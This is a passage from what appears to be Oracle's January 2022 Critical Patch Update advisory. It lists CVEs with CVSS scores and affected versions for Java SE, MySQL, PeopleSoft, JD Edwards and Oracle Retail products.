| CVE-2022-21305 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Hotspot | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21277 | Oracle Java SE, Oracle GraalVM Enterprise Edition | ImageIO | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21360 | Oracle Java SE, Oracle GraalVM Enterprise Edition | ImageIO | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21365 | Oracle Java SE, Oracle GraalVM Enterprise Edition | ImageIO | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21366 | Oracle Java SE, Oracle GraalVM Enterprise Edition | ImageIO | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21282 | Oracle Java SE, Oracle GraalVM Enterprise Edition | JAXP | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21296 | Oracle Java SE, Oracle GraalVM Enterprise Edition | JAXP | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21299 | Oracle Java SE, Oracle GraalVM Enterprise Edition | JAXP | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21271 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21283 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21293 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21294 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21340 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21341 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Serialization | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |
| CVE-2022-21248 | Oracle Java SE, Oracle GraalVM Enterprise Edition | Serialization | Multiple | Yes | 3.7 | Network | High | None | None | Un- changed | None | Low | None | Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4, 21.3.0 | See Note 1 |

#### Notes:

1. This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs.

#### Additional CVEs addressed are:

* The patch for CVE-2021-22959 also addresses CVE-2021-22960.

#### Oracle JD Edwards Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle JD Edwards.  This vulnerability is not remotely exploitable without authentication, i.e., may not be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#JDE)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-23337 | JD Edwards EnterpriseOne Tools | E1 Dev Platform Tech - Cloud (Lodash) | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | Prior to 9.2.6.1 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-23337 also addresses CVE-2020-28500.

#### Oracle MySQL Risk Matrix

This Critical Patch Update contains 78 new security patches for Oracle MySQL.  3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#MSQL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-22946 | MySQL Server | Server: Compiling (cURL) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2021-3712 | MySQL Connectors | Connector/C++ (OpenSSL) | MySQL Protocol | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 8.0.27 and prior |  |
| CVE-2021-3712 | MySQL Connectors | Connector/ODBC (OpenSSL) | MySQL Protocol | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 8.0.27 and prior |  |
| CVE-2022-21278 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 7.1 | Network | Low | Low | None | Un- changed | None | Low | High | 8.0.26 and prior |  |
| CVE-2022-21351 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 7.1 | Network | Low | Low | None | Un- changed | None | Low | High | 8.0.27 and prior |  |
| CVE-2022-21363 | MySQL Connectors | Connector/J | MySQL Protocol | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.0.27 and prior |  |
| CVE-2022-21358 | MySQL Server | Server: Security: Encryption | MySQL Protocol | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2021-3634 | MySQL Workbench | Workbench: libssh | MySQL Workbench | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21279 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21280 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21284 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21285 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21286 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21287 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21288 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21289 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21290 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 8.0.27 and prior |  |
| CVE-2022-21307 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21308 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 8.0.27 and prior |  |
| CVE-2022-21309 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21310 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21314 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21315 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21316 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Local | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21318 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Local | High | High | Required | Un- changed | High | High | High | 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21320 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 8.0.27 and prior |  |
| CVE-2022-21322 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 8.0.27 and prior |  |
| CVE-2022-21326 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21327 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21328 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21329 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21330 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21332 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21334 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 8.0.27 and prior |  |
| CVE-2022-21335 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21336 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21337 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21356 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21380 | MySQL Cluster | Cluster: General | Multiple | No | 6.3 | Adjacent Network | High | High | Required | Un- changed | High | High | High | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21352 | MySQL Server | InnoDB | MySQL Protocol | No | 5.9 | Network | High | High | None | Un- changed | None | High | High | 8.0.26 and prior |  |
| CVE-2022-21367 | MySQL Server | Server: Compiling | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2022-21301 | MySQL Server | Server: DML | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 8.0.27 and prior |  |
| CVE-2022-21378 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 5.5 | Network | Low | High | None | Un- changed | None | Low | High | 8.0.27 and prior |  |
| CVE-2022-21302 | MySQL Server | InnoDB | MySQL Protocol | No | 5.3 | Network | High | Low | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21254 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 5.3 | Network | High | Low | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21348 | MySQL Server | InnoDB | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21270 | MySQL Server | Server: Federated | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2022-21256 | MySQL Server | Server: Group Replication Plugin | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21379 | MySQL Server | Server: Group Replication Plugin | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21362 | MySQL Server | Server: Information Schema | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21374 | MySQL Server | Server: Information Schema | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21253 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21264 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21297 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.26 and prior |  |
| CVE-2022-21339 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21342 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21370 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 8.0.27 and prior |  |
| CVE-2022-21304 | MySQL Server | Server: Parser | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2022-21344 | MySQL Server | Server: Replication | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2022-21303 | MySQL Server | Server: Stored Procedure | MySQL Protocol | No | 4.9 | Network | Low | High | None | Un- changed | None | None | High | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2022-21368 | MySQL Server | Server: Components Services | MySQL Protocol | No | 4.7 | Network | Low | High | None | Un- changed | Low | Low | Low | 8.0.27 and prior |  |
| CVE-2022-21245 | MySQL Server | Server: Security: Privileges | MySQL Protocol | No | 4.3 | Network | Low | Low | None | Un- changed | None | Low | None | 5.7.36 and prior, 8.0.27 and prior |  |
| CVE-2022-21265 | MySQL Server | Server: Optimizer | MySQL Protocol | No | 3.8 | Network | Low | High | None | Un- changed | None | Low | Low | 8.0.27 and prior |  |
| CVE-2022-21311 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21312 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21313 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21317 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21319 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21321 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21323 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21324 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21325 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21331 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21333 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21355 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21357 | MySQL Cluster | Cluster: General | Multiple | No | 2.9 | Adjacent Network | High | High | Required | Un- changed | Low | None | Low | 7.4.34 and prior, 7.5.24 and prior, 7.6.20 and prior, 8.0.27 and prior |  |
| CVE-2022-21249 | MySQL Server | Server: DDL | MySQL Protocol | No | 2.7 | Network | Low | High | None | Un- changed | None | None | Low | 8.0.27 and prior |  |
| CVE-2022-21372 | MySQL Server | Server: Security: Encryption | MySQL Protocol | No | 2.7 | Network | Low | High | None | Un- changed | None | None | Low | 8.0.27 and prior |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-22946 also addresses CVE-2021-22947.
* The patch for CVE-2021-3712 also addresses CVE-2021-3711.

#### Oracle PeopleSoft Risk Matrix

This Critical Patch Update contains 13 new security patches for Oracle PeopleSoft.  10 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#PS)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-22931 | PeopleSoft Enterprise PeopleTools | Elastic Search (Node.js) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.57, 8.58, 8.59 |  |
| CVE-2021-2351 | PeopleSoft Enterprise PeopleTools | Change Impact Analyzer (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.57, 8.58, 8.59 |  |
| CVE-2022-21300 | PeopleSoft Enterprise CS SA Integration Pack | Snapshot Integration | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 9.0, 9.2 |  |
| CVE-2021-37137 | PeopleSoft Enterprise PeopleTools | Elastic Search (Netty) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.57, 8.58, 8.59 |  |
| CVE-2021-22946 | PeopleSoft Enterprise PeopleTools | File Processing (cURL) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.57, 8.58, 8.59 |  |
| CVE-2021-3712 | PeopleSoft Enterprise PeopleTools | Security (OpenSSL) | Multiple | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 8.57, 8.58, 8.59 |  |
| CVE-2021-23337 | PeopleSoft Enterprise PeopleTools | Elastic Search (Lodash) | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | 8.58, 8.59 |  |
| CVE-2022-21345 | PeopleSoft Enterprise PeopleTools | Security | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | High | None | None | 8.58, 8.59 |  |
| CVE-2022-21359 | PeopleSoft Enterprise PeopleTools | Optimization Framework | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.57, 8.58, 8.59 |  |
| CVE-2022-21272 | PeopleSoft Enterprise PeopleTools | Portal | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.57, 8.58, 8.59 |  |
| CVE-2022-21369 | PeopleSoft Enterprise PeopleTools | Rich Text Editor | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.57, 8.58, 8.59 |  |
| CVE-2021-37695 | PeopleSoft Enterprise PeopleTools | Rich Text Editor (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 8.57, 8.58, 8.59 |  |
| CVE-2022-21364 | PeopleSoft Enterprise PeopleTools | Weblogic | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 8.57, 8.58, 8.59 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-22931 also addresses CVE-2021-22939 and CVE-2021-22940.
* The patch for CVE-2021-22946 also addresses CVE-2021-22924, CVE-2021-22925, CVE-2021-22926 and CVE-2021-22947.
* The patch for CVE-2021-23337 also addresses CVE-2020-28500 and CVE-2020-8203.
* The patch for CVE-2021-3712 also addresses CVE-2021-3711.
* The patch for CVE-2021-37137 also addresses CVE-2021-37136.
* The patch for CVE-2021-37695 also addresses CVE-2021-32808 and CVE-2021-32809.

#### Oracle Policy Automation Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle Policy Automation.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#POLI)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Policy Automation | Determinations Engine (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.0-12.2.24 |  |

#### Oracle Retail Applications Risk Matrix

This Critical Patch Update contains 43 new security patches for Oracle Retail Applications.  34 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#RAPP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2020-13936 | Oracle Retail Integration Bus | RIB Kernal (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 19.0.1 |  |
| CVE-2020-13936 | Oracle Retail Order Broker | Order Broker Foundation (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 16.0 |  |
| CVE-2020-13936 | Oracle Retail Service Backbone | RSB kernel (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 19.0.1 |  |
| CVE-2021-2351 | Oracle Retail Analytics | Other (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 16.0.0-16.0.2 |  |
| CVE-2021-2351 | Oracle Retail Assortment Planning | Application Core (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 16.0.3 |  |
| CVE-2021-2351 | Oracle Retail Back Office | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1 |  |
| CVE-2021-2351 | Oracle Retail Central Office | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1 |  |
| CVE-2021-2351 | Oracle Retail Customer Insights | Other (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 16.0.0-16.0.2 |  |
| CVE-2021-2351 | Oracle Retail Extract Transform and Load | Mathematical Operators (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 13.2.8 |  |
| CVE-2021-2351 | Oracle Retail Financial Integration | PeopleSoft Integration Bugs (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-2351 | Oracle Retail Integration Bus | RIB Kernal (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-2351 | Oracle Retail Merchandising System | Foundation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 19.0.1 |  |
